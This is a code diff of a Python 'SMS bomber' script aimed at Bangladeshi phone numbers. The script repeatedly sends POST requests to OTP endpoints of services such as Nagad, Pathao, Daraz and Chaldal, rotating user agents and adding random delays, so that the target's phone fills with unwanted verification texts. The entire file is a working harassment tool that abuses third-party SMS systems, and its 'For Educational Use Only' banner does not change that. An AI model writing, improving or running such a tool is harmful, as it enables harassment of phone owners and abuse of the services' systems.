@@ -4,45 +4,42 @@ import time
 import random
 import sys
 import os
-from datetime import datetime
 
-# Hacker-style ASCII art
-HACKER_ART = """
-          ____  __  _______ ____ ___  ____  ____  
-         / ___||  \/  | ____|  _ \\  _ \\ ___ \\ 
-        \\___ \\| |\\/| |  _| | | | | | | |  _  /
-         ___) | |  | | |___| |_| | |_| | | \\ \\
-        |____/|_|  |_|_____|____/ \\___/|_|  \\_\\
+# ANSI escape codes for colors
+class Colors:
+    GREEN = '\033[92m'  # Success er jonno green
+    RED = '\033[91m'    # Failed er jonno red
+    YELLOW = '\033[93m' # Info er jonno yellow
+    CYAN = '\033[96m'   # Input er jonno cyan
+    RESET = '\033[0m'   # Reset color
+
+# "SM" ASCII Art
+SM_ART = f"""
+{Colors.CYAN}
+   _____ __  __ 
+  / ____|  \/  |
+ | (___ | \  / |
+  \___ \| |\/| |
+  ____) | |  | |
+ |_____/|_|  |_|
         
-        === SM CORPORATE 🍁 SMS Bomber ===
-        Coded by: SM CORPORATE Team
+        {Colors.YELLOW}=== SM CORPORATE 🍁 SMS Bomber ==={Colors.RESET}
+        Coded by: SM
         For Educational Use Only!
 """
 
-# List of APIs (all POST, Bangladeshi-focused)
+# API list (Bangladeshi services)
 APIs = [
-    {"name": "Ostad OTP", "url": "https://ostad.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Chaldal OTP", "url": "https://chaldal.com/api/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Sheba.xyz OTP", "url": "https://sheba.xyz/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Bikroy OTP", "url": "https://bikroy.com.bd/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Daraz OTP", "url": "https://daraz.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
     {"name": "Nagad OTP", "url": "https://www.nagad.com.bd/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
     {"name": "Pathao OTP", "url": "https://pathao.com/api/otp/send", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Foodpanda OTP", "url": "https://www.foodpanda.com.bd/api/v2/otp/send", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Pickaboo OTP", "url": "https://www.pickaboo.com/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "ShopUp OTP", "url": "https://www.shopup.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Meena Bazar OTP", "url": "https://meenabazar.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "PriyoShop OTP", "url": "https://www.priyoshop.com/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Evaly OTP", "url": "https://evaly.com.bd/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "AjkerDeal OTP", "url": "https://ajkerdeal.com/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Grameenphone OTP", "url": "https://grameenphone.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Robi OTP", "url": "https://robi.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
+    {"name": "Daraz OTP", "url": "https://daraz.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
+    {"name": "Chaldal OTP", "url": "https://chaldal.com/api/otp", "method": "POST", "data": {"phone": "{number}"}},
+    # Add more APIs as needed
 ]
 
 # Random User-Agents
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
 ]
 
@@ -52,89 +49,71 @@ def clear_screen():
 def validate_phone(phone):
     return phone.isdigit() and len(phone) == 11 and phone.startswith("01")
 
-def format_phone_number(api_name, phone):
-    if api_name in ["Grameenphone OTP", "Robi OTP"]:
-        return phone if phone.startswith("01") else "0" + phone
-    return phone
-
 def send_request(api, phone):
-    formatted_phone = format_phone_number(api["name"], phone)
     url = api["url"]
-    data = json.loads(json.dumps(api["data"]).replace("{number}", formatted_phone))
+    data = json.loads(json.dumps(api["data"]).replace("{number}", phone))
     headers = {
         "Content-Type": "application/json",
         "User-Agent": random.choice(USER_AGENTS),
-        "Accept": "application/json, text/plain, */*",
-        "Origin": "https://www.example.com",
-        "Referer": "https://www.example.com/",
     }
 
     try:
         response = requests.post(url, json=data, headers=headers, timeout=10)
-        status = "Success" if response.status_code < 400 else f"Failed (Status: {response.status_code})"
-        return {"success": response.status_code < 400, "status": status}
-    except requests.RequestException as e:
-        return {"success": False, "status": f"Error: {str(e)}"}
+        if response.status_code < 400:  # Success mane OTP send hoise
+            return {"success": True, "status": "Success"}
+        else:
+            return {"success": False, "status": "Failed"}
+    except requests.RequestException:
+        return {"success": False, "status": "Failed"}
 
 def main():
     clear_screen()
-    print(HACKER_ART)
+    print(SM_ART)
     
-    # Input phone number
-    phone = input("Enter Bangladeshi phone number (e.g., 01712345678): ").strip()
+    # Phone number input
+    phone = input(f"{Colors.CYAN}Bangladeshi number dao (e.g., 01712345678): {Colors.RESET}").strip()
     if not validate_phone(phone):
-        print("Invalid Bangladeshi number! Must be 11 digits starting with 01.")
-        input("Press Enter to exit...")
+        print(f"{Colors.RED}Number vul! 11 digit hote hobe, 01 diye start hobe.{Colors.RESET}")
+        input("Enter press kore exit koro...")
         return
 
-    # Input message count
+    # Message count input
     try:
-        count = int(input("Enter number of messages (1-100): ").strip())
+        count = int(input(f"{Colors.CYAN}Koto message pathabo (1-100): {Colors.RESET}").strip())
         if not 1 <= count <= 100:
             raise ValueError
     except ValueError:
-        print("Invalid message count! Must be 1-100.")
-        input("Press Enter to exit...")
+        print(f"{Colors.RED}Vul count! 1-100 er moddhe hobe.{Colors.RESET}")
+        input("Enter press kore exit koro...")
         return
 
-    # Input delay
+    # Delay input
     try:
-        delay = float(input("Enter delay between requests (seconds, e.g., 2): ").strip())
+        delay = float(input(f"{Colors.CYAN}Koto second delay debo (e.g., 2): {Colors.RESET}").strip())
         if delay < 0:
             raise ValueError
     except ValueError:
-        print("Invalid delay! Must be a non-negative number.")
-        input("Press Enter to exit...")
+        print(f"{Colors.RED}Vul delay! 0 or beshi hobe.{Colors.RESET}")
+        input("Enter press kore exit koro...")
         return
 
-    print(f"\nStarting SMS bombing to {phone} with {count} messages (delay: {delay}s)...")
-    total_requests = len(APIs) * count
-    current_request = 0
+    print(f"\n{Colors.YELLOW}{phone} e {count} ta message pathacchi (delay: {delay}s)...{Colors.RESET}")
 
     for i in range(count):
-        random.shuffle(APIs)  # Randomize API order
-        for api in APIs:
-            result = send_request(api, phone)
-            current_request += 1
-            progress = (current_request / total_requests) * 100
-            status = f"[{current_request}/{total_requests}] {api['name']}: {result['status']}"
-            print(f"{status} | Progress: {progress:.1f}%")
+        api = random.choice(APIs)  # Random ekta API select
+        result = send_request(api, phone)
+        if result["success"]:
+            print(f"{Colors.GREEN}[{i+1}/{count}] {api['name']}: Success{Colors.RESET}")
+        else:
+            print(f"{Colors.RED}[{i+1}/{count}] {api['name']}: Failed{Colors.RESET}")
+        time.sleep(delay + random.uniform(0, 1))  # Delay + random 0-1s
 
-            if not result["success"] and "429" in result["status"]:
-                print("Rate limit detected. Pausing for 10 seconds...")
-                time.sleep(10)
-            else:
-                time.sleep(delay + random.uniform(0, 1))  # User delay + random 0-1s
-
-        if i < count - 1:
-            time.sleep(random.uniform(5, 10))  # Delay between rounds
-
-    print("\nSMS bombing completed successfully!")
-    input("Press Enter to exit...")
+    print(f"\n{Colors.GREEN}SMS bombing completed successfully!{Colors.RESET}")
+    input("Press enter to exit...")
 
 if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print("\nStopped by user.")
+        print(f"\n{Colors.RED}Stopped by user.{Colors.RESET}")
         sys.exit(0)
